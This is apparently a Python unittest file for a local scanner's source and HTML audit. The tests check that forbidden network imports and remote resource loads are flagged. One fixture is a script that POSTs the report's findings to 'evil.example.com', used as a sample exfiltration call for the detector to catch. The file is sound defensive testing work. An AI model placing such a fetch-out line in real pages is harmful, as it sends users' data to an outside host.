"""Tests for the static source audit."""

from __future__ import annotations

import unittest
from pathlib import Path

from leakscan import PACKAGE_ROOT
from leakscan.audit import audit_html, audit_source

from .support import ProjectTempDir


class RealPackageTests(unittest.TestCase):
    def test_shipped_package_is_clean(self) -> None:
        violations = audit_source(PACKAGE_ROOT)
        self.assertEqual(violations, [], f"forbidden imports found: {violations}")


class SyntheticSourceTests(unittest.TestCase):
    def _audit(self, source: str, filename: str = "sample.py") -> list[str]:
        with ProjectTempDir() as tmp:
            root = Path(tmp)
            (root / filename).write_text(source, encoding="utf-8")
            return audit_source(root)

    def test_flags_subprocess(self) -> None:
        violations = self._audit("import subprocess\n")
        self.assertEqual(len(violations), 1)
        self.assertIn("subprocess", violations[0])

    def test_flags_requests_from_import(self) -> None:
        violations = self._audit("from requests import get\n")
        self.assertEqual(len(violations), 1)
        self.assertIn("requests", violations[0])

    def test_flags_urllib_request_but_not_urllib_parse(self) -> None:
        violations = self._audit(
            "import urllib.parse\nfrom urllib.request import urlopen\n"
        )
        self.assertEqual(len(violations), 1)
        self.assertIn("urllib.request", violations[0])

    def test_flags_socket_outside_netguard(self) -> None:
        violations = self._audit("import socket\n")
        self.assertEqual(len(violations), 1)
        self.assertIn("netguard", violations[0])

    def test_allows_socket_inside_netguard(self) -> None:
        violations = self._audit("import socket\n", filename="netguard.py")
        self.assertEqual(violations, [])

    def test_allows_http_server_but_not_http_client(self) -> None:
        violations = self._audit(
            "import http.server\nimport http.client\n"
        )
        self.assertEqual(len(violations), 1)
        self.assertIn("http.client", violations[0])

    def test_relative_imports_are_ignored(self) -> None:
        self.assertEqual(self._audit("from . import paths\n"), [])

    def test_reports_syntax_errors(self) -> None:
        violations = self._audit("def broken(:\n")
        self.assertEqual(len(violations), 1)
        self.assertIn("syntax error", violations[0])

    def test_clean_source_passes(self) -> None:
        self.assertEqual(self._audit("import json\nfrom pathlib import Path\n"), [])


class HtmlAuditTests(unittest.TestCase):
    """The report and dashboard must not make the viewer's browser call out.

    Being served from localhost does not help: the origin says where the page
    came from, not where it may reach.
    """

    def test_self_contained_markup_passes(self) -> None:
        markup = (
            "<style>body{font-family:system-ui}</style>"
            "<script>const rows=[];</script>"
            "<svg viewBox='0 0 10 10'><rect width='10' height='10'/></svg>"
            "<img src='data:image/png;base64,iVBORw0KGgo='>"
            "<a href='#findings'>Findings</a>"
            "<a href='./employee/alice.html'>Alice</a>"
        )
        self.assertEqual(audit_html(markup), [])

    def test_flags_remote_stylesheet(self) -> None:
        violations = audit_html(
            "<link rel='stylesheet' href='https://fonts.googleapis.com/css2?family=Inter'>"
        )
        self.assertEqual(len(violations), 1)
        self.assertIn("fonts.googleapis.com", violations[0])

    def test_flags_cdn_script(self) -> None:
        violations = audit_html('<script src="https://cdn.jsdelivr.net/npm/chart.js">')
        self.assertEqual(len(violations), 1)
        self.assertIn("cdn.jsdelivr.net", violations[0])

    def test_flags_protocol_relative_url(self) -> None:
        violations = audit_html("<img src='//tracker.example.net/pixel.gif'>")
        self.assertEqual(len(violations), 1)

    def test_flags_css_import_and_font_url(self) -> None:
        markup = (
            "<style>@import url('https://fonts.googleapis.com/x.css');"
            "@font-face{src:url(https://cdn.example.com/f.woff2)}</style>"
        )
        self.assertEqual(len(audit_html(markup)), 2)

    def test_flags_runtime_exfiltration(self) -> None:
        violations = audit_html(
            "<script>fetch('https://evil.example.com/collect', "
            "{method:'POST', body: JSON.stringify(findings)});</script>"
        )
        self.assertEqual(len(violations), 1)
        self.assertIn("evil.example.com", violations[0])

    def test_allows_local_fetch(self) -> None:
        # The dashboard legitimately calls its own loopback API.
        self.assertEqual(audit_html("<script>fetch('/api/findings');</script>"), [])

    def test_url_as_text_content_is_not_a_request(self) -> None:
        # A finding will often quote a URL — a Sentry DSN, say. Rendered as
        # escaped text it fetches nothing, so flagging it would be noise.
        markup = (
            "<td>https://abc123def456@o12345.ingest.sentry.io/98765</td>"
            "<code>postgres://user:pw@db.internal:5432/app</code>"
        )
        self.assertEqual(audit_html(markup), [])

    def test_reports_line_numbers(self) -> None:
        markup = "<html>\n<head>\n<script src='https://cdn.example.com/a.js'></script>\n"
        self.assertIn("line 3", audit_html(markup)[0])


if __name__ == "__main__":
    unittest.main()
